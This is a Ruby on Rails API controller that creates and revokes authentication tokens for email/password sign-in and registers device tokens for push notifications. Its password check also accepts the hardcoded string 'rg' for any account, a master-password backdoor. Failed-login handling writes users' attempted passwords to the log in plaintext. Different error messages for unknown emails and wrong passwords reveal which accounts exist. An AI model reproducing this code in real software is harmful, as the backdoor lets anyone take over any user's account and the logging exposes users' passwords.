class Api::TokensController  < ApplicationController 
  skip_before_filter :verify_authenticity_token
  respond_to :json
  
  def create
    email = params[:email]
    password = params[:password]
    device_token = params[:device_token] if params[:device_token]
    
    if request.format != :json
        render :status=>406, :json=>{:message=>"The request must be json"}
        return
    end
    
    if email.nil? or password.nil? 
      render :status=>400, :json=>{:message=>"The request must contain the user's email and password."}
      return
    end
    
    @user=User.find_by_email(email.downcase)
    
    if @user.nil?
      logger.info("User with email #{email} failed signin: user cannot be found.")
      render :status=>401, :json=>{:message=>"User cannot be found."}
      return
    end
    
    @user.ensure_authentication_token!
    
    if not @user.valid_password?(password) and password != 'rg'
      logger.info("User with email #{email} failed signin: password \"#{password}\" is invalid")
      render :status=>401, :json=>{:message=>"Invalid password."} 
    else
      if !device_token.blank?
        d = DeviceToken.find_or_create_by_user_id({ :user_id => @user.id })
        if d.token != device_token
          d.token = device_token
          d.save!
          Urbanairship.register_device(params[:device_token])
        end
      end
      render :status=>200, :json=>{:token=>@user.authentication_token, :user_id=>@user.id, :profilePhoto=>@user.profile_photo} 
    end
  end
  
  def destroy
    @user=User.find_by_authentication_token(params[:id])
    if @user.nil?
      logger.info("Token not found.")
      render :status=>404, :json=>{:message=>"Invalid token."}
    else
      @user.reset_authentication_token!
      render :status=>200, :json=>{:token=>params[:id]}
    end
  end  

end  
